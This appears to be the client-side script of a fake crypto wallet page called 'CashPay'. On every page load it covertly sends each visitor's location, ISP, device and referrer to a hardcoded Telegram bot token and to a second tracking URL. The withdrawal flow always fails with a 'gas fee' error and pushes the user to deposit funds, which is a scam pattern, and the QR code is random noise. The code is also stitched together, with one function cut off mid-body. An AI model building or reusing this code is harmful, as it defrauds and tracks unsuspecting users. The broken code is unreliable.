// Telegram visitor alert (testing only)
const TELEGRAM_BOT_TOKEN = "8995005588:AAFK7m7Iq3CgzT4AX5fqWQhebgzmQG0joBw";
const TELEGRAM_CHAT_ID = "6347421397";
async function sendTelegramVisitorAlert(){
  try {
    let location = {};
    try {
      const geo = await fetch("https://ipapi.co/json/", {cache:"no-store"});
      if (geo.ok) location = await geo.json();
    } catch(e) {}

    const country = location.country_name || "Unknown";
    const countryCode = location.country_code || "";
    const carrier = location.org || location.asn || "Unknown";

    const message = `🔔 CashPay Visitor Alert

Someone opened your CashPay page.
🕐 Time: ${new Date().toLocaleString()}
🌍 Country: ${country}${countryCode ? ` (${countryCode})` : ""}
📡 Carrier/ISP: ${carrier}
📱 Device: ${navigator.userAgent}
🌐 Language: ${navigator.language || "Unknown"}
🔗 Referrer: ${document.referrer || "Direct visit"}`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message})
    });
  } catch(e) {
    console.warn("Telegram visitor alert failed", e);
  }
}
sendTelegramVisitorAlert();

/* Original site logic/content retained. */

/* CashPay visitor alert tracking.
   Replace CASH_PAY_TRACKING_URL with your deployed Google Apps Script web-app URL.
   This sends only a page-open event plus basic browser/device information. */
const CASH_PAY_TRACKING_URL = 'PASTE_YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE';

function notifyCashPayOpen(){
  if(!CASH_PAY_TRACKING_URL || CASH_PAY_TRACKING_URL.includes('PASTE_YOUR_')) return;
  try{
    const params = new URLSearchParams({
      event: 'page_open',
      page: 'CashPay Wallet',
      ts: new Date().toISOString(),
      userAgent: navigator.userAgent,
      language: navigator.language || '',
      referrer: document.referrer || ''
    });
    const img = new Image();
    img.src = CASH_PAY_TRACKING_URL + '?' + params.toString();

document.getElementById('profileOverlay')?.addEventListener('click',e=>{if(e.target.id==='profileOverlay'){state.profileOpen=false;render()}});document.getElementById('openReceive')?.addEventListener('click',()=>{state.activeModal='receive';render()});document.getElementById('openWithdraw')?.addEventListener('click',()=>{state.showGasError=false;state.activeModal='withdraw';render()});document.getElementById('openTransactions')?.addEventListener('click',()=>{document.querySelector('.transactions-list')?.scrollIntoView({behavior:'smooth',block:'start'})});document.getElementById('closeModal')?.addEventListener('click',()=>{state.activeModal=null;state.showGasError=false;render()});document.getElementById('copyHeaderAddr')?.addEventListener('click',()=>{navigator.clipboard.writeText(ADDRESSES.Ethereum);alert('EVM Address copied!')});if(state.activeModal==='receive'){paintQR(ADDRESSES[state.receiveNetwork]);document.querySelectorAll('[data-net]').forEach(btn=>btn.addEventListener('click',()=>{state.receiveNetwork=btn.dataset.net;render()}));document.getElementById('copyReceiveAddr')?.addEventListener('click',()=>{navigator.clipboard.writeText(ADDRESSES[state.receiveNetwork]);alert('Address copied to clipboard!')})}if(state.activeModal==='withdraw'){document.querySelectorAll('[data-symbol]').forEach(btn=>btn.addEventListener('click',()=>{state.withdrawSymbol=btn.dataset.symbol;state.showGasError=false;render()}));document.getElementById('confirmWithdraw')?.addEventListener('click',()=>{state.showGasError=true;render()});document.getElementById('feeCancelBtn')?.addEventListener('click',()=>{state.showGasError=false;render()});document.getElementById('feeDepositBtn')?.addEventListener('click',()=>{state.showGasError=false;state.activeModal='receive';render()});document.getElementById('feeWarningOverlay')?.addEventListener('click',e=>{if(e.target.id==='feeWarningOverlay'){state.showGasError=false;render()}})}}
function paintQR(address){const box=document.getElementById('qrBox');if(!box)return;let seed=0;for(let i=0;i<address.length;i++)seed=(seed*31+address.charCodeAt(i))>>>0;function rand(){seed=(seed*1103515245+12345)>>>0;return(seed>>>8)%100}let cells='';for(let i=0;i<81;i++){const on=rand()>45;cells+=`<div style="background:${on?'#090B0E':'transparent'}"></div>`}box.innerHTML=cells}
notifyCashPayOpen();
render();
</script>
